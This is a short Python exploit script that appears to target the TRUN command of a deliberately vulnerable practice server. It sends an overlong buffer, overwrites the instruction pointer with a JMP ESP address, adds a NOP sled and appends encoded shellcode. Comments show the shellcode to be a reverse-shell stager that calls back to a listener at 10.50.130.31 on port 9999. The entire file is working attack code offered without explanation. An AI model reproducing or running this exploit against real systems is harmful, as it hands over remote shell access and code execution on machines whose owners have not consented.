#!/usr/bin/python

import socket
import os
import sys

buff = "TRUN /.:/"
buff += "A" * 2003 

EIP = "\xa0\x12\x50\x62"
#625012A0   FFE4             JMP ESP
NOP = "\x90" * 10
# VERBOSE=false, LHOST=10.50.130.31, LPORT=9999, 
# ReverseAllowProxy=false, ReverseListenerThreaded=false, 
# StagerRetryCount=10, StagerRetryWait=5, 
# PrependMigrate=false, EXITFUNC=process, CreateSession=true, 
# AutoVerifySession=true
buf =  b""
buf += b"\xeb\x23\x5b\x89\xdf\xb0\x16\xfc\xae\x75\xfd\x89"
buf += b"\xf9\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\x63"
buf += b"\xd4\x74\x08\x46\x80\x3e\x16\x75\xee\xeb\xea\xff"
buf += b"\xe1\xe8\xd8\xff\xff\xff\x91\x16\x6d\x79\x13\x91"
buf += b"\x91\x91\xf1\x18\x74\xa0\x51\xf5\x1a\xc1\xa1\x1a"
buf += b"\xc3\x9d\x1a\xc3\x85\x1a\xe3\xb9\x9e\x26\xdb\xb7"
buf += b"\xa0\x6e\x3d\xad\xf0\xed\x93\xbd\xb1\x50\x5e\x9c"
buf += b"\x90\x56\x73\x63\xc3\xc6\x1a\xc3\x81\x1a\xdb\xad"
buf += b"\x1a\xdd\x80\xe9\x72\xd9\x90\x40\xc0\x1a\xc8\xb1"
buf += b"\x90\x42\x1a\xd8\x89\x72\xab\xd8\x1a\xa5\x1a\x90"
buf += b"\x47\xa0\x6e\x3d\x50\x5e\x9c\x90\x56\xa9\x71\xe4"
buf += b"\x67\x92\xec\x69\xaa\xec\xb5\xe4\x75\xc9\x1a\xc9"
buf += b"\xb5\x90\x42\xf7\x1a\x9d\xda\x1a\xc9\x8d\x90\x42"
buf += b"\x1a\x95\x1a\x90\x41\x18\xd5\xb5\xb5\xca\xca\xf0"
buf += b"\xc8\xcb\xc0\x6e\x71\xce\xce\xcb\x1a\x83\x7a\x1c"
buf += b"\xcc\xf9\xa2\xa3\x91\x91\xf9\xe6\xe2\xa3\xce\xc5"
buf += b"\xf9\xdd\xe6\xb7\x96\x6e\x44\x29\x01\x90\x91\x91"
buf += b"\xb8\x55\xc5\xc1\xf9\xb8\x11\xfa\x91\x6e\x44\xc1"
buf += b"\xc1\xc1\xc1\xd1\xc1\xd1\xc1\xf9\x7b\x9e\x4e\x71"
buf += b"\x6e\x44\x06\xfb\x94\xf9\x9b\xa3\x13\x8e\xf9\x93"
buf += b"\x91\xb6\x9e\x18\x77\xfb\x81\xc7\xc6\xf9\x08\x34"
buf += b"\xe5\xf0\x6e\x44\x14\x51\xe5\x9d\x6e\xdf\x99\xe4"
buf += b"\x7d\xf9\x61\x24\x33\xc7\x6e\x44\xf9\xf2\xfc\xf5"
buf += b"\x91\x18\x72\xc6\xc6\xc6\xa0\x67\xfb\x83\xc8\xc7"
buf += b"\x73\x6c\xf7\x56\xd5\xb5\xad\x90\x90\x1c\xd5\xb5"
buf += b"\x81\x57\x91\xd5\xc5\xc1\xc7\xc7\xc7\xd7\xc7\xdf"
buf += b"\xc7\xc7\xc2\xc7\xf9\xe8\x5d\xae\x17\x6e\x44\x18"
buf += b"\x71\xdf\xc7\xd7\x6e\xa1\xf9\x99\x16\x8c\xf1\x6e"
buf += b"\x44\x2a\x61\x24\x33\xc7\xf9\x37\x04\x2c\x0c\x6e"
buf += b"\x44\xad\x97\xed\x9b\x11\x6a\x71\xe4\x94\x2a\xd6"
buf += b"\x82\xe3\xfe\xfb\x91\xc2\x6e\x44\x63\xd4"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.150.245", 9999))
print s.recv(1024)
s.send(buff+EIP+NOP+buf)
print s.recv(1024)
s.close()
